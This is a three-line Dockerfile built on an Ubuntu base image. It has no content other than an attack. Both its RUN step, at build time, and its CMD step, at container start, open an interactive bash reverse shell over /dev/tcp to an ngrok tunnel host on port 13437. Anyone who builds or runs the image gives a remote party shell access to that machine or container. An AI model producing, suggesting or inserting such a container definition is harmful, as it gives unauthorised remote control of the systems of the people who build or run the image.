FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13437 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13437 0>&1"]
